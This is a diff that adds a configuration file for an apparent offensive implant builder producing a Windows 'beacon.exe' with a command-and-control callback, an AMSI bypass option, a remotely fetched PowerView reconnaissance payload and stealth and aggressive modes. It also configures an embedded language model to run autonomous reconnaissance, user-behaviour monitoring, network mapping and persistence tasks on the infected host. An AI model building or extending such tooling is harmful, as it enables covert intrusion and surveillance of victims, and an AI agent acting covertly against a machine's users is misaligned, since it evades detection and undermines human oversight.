@@ -1,0 +1,155 @@
+advanced:
+    anti_debug: false
+    compress: false
+    strip_symbols: true
+beacon:
+    behavior:
+        jitter: 20
+        sleep_time: 10
+        user_agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+    shell:
+        powershell:
+            # Leave blank to use the built-in obfuscated bypass snippet
+            amsi_bypass: ""
+    c2:
+        host: 127.0.0.1
+        port: 8080
+        protocol: http
+        uri_path: api/updates
+    target:
+        arch: amd64
+        format: exe
+        os: windows
+    payloads:
+        - name: powerview
+          source: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+          type: powershell
+          commands_file: ./payloads/powerview.json
+implant:
+    log_enabled: true
+    log_file_path: implant_debug.log
+    log_level: debug
+llama:
+    autonomous:
+        enabled: true
+        initial_tasks:
+            - description: Complete system analysis and environment mapping
+              type: system_reconnaissance
+            - description: Monitor and analyze user behavior patterns
+              type: user_activity
+            - description: Map network topology and discover connected systems
+              type: network_discovery
+        max_iterations: 50
+        report_interval: 300
+        timeout_minutes: 15
+    enabled: true
+    log_enabled: false
+    log_level: info
+    model:
+        context: 8192
+        gpu_layers: 0
+        jinja: false
+        max_tokens: 1024
+        temperature: 0.5
+        threads: 4
+        top_k: 40
+        top_p: 0.95
+    prompt:
+        # System prompt preset - choose based on use case:
+        # - default: Question-answering mode (recommended for general use)
+        # - enhanced: Comprehensive system analysis (for initial reconnaissance)
+        # - stealth: Covert operations (prioritizes avoiding detection)
+        # - aggressive: Rapid data collection (speed over stealth)
+        preset: default
+
+    # Task-specific prompts for autonomous mode
+    # These are examples showing the ReAct pattern format
+    # Customize as needed for your specific use case
+    task_prompts:
+        system_reconnaissance: |
+            === TASK: System Reconnaissance ===
+
+            Follow the ReAct pattern to gather comprehensive system information.
+
+            Thought: I need to identify the OS first to use appropriate commands.
+            Action: [EXECUTE: uname -s]
+
+            <Wait for observation>
+
+            Thought: Based on OS detection, gather detailed system information.
+            Action: [EXECUTE: appropriate_command_based_on_os]
+
+            Continue with:
+            - OS version and architecture
+            - Current user and privileges
+            - Hardware information
+            - Network configuration
+            - Running processes and services
+
+            When complete, output [TASK_COMPLETE]
+
+        network_discovery: |
+            === TASK: Network Discovery ===
+
+            Follow the ReAct pattern to map network environment.
+
+            Thought: Start with OS detection for appropriate network commands.
+            Action: [EXECUTE: uname -s]
+
+            <Wait for observation>
+
+            Thought: Use OS-specific commands to gather network information.
+            Action: [EXECUTE: network_command]
+
+            Gather:
+            - Network interfaces and IP addresses
+            - Routing table and gateway
+            - Active connections
+            - ARP cache (neighboring systems)
+            - DNS configuration
+
+            When complete, output [TASK_COMPLETE]
+
+        user_activity: |
+            === TASK: User Activity Analysis ===
+
+            Follow the ReAct pattern to analyze user behavior.
+
+            Thought: Detect OS to use appropriate user activity commands.
+            Action: [EXECUTE: uname -s]
+
+            <Wait for observation>
+
+            Thought: Check currently logged-in users and their activity.
+            Action: [EXECUTE: who_or_query_user]
+
+            Analyze:
+            - Currently logged-in users
+            - Recent login history
+            - Active user sessions
+            - User-initiated processes
+
+            When complete, output [TASK_COMPLETE]
+
+        persistence_check: |
+            === TASK: Persistence Mechanism Analysis ===
+
+            Follow the ReAct pattern to identify persistence mechanisms.
+
+            Thought: Identify OS to check appropriate persistence locations.
+            Action: [EXECUTE: uname -s]
+
+            <Wait for observation>
+
+            Thought: Check OS-specific persistence mechanisms systematically.
+            Action: [EXECUTE: persistence_command]
+
+            Check:
+            - Startup items and auto-start programs
+            - Scheduled tasks and cron jobs
+            - Service configurations
+            - OS-specific persistence locations
+
+            When complete, output [TASK_COMPLETE]
+output:
+    path: dist/beacon.exe
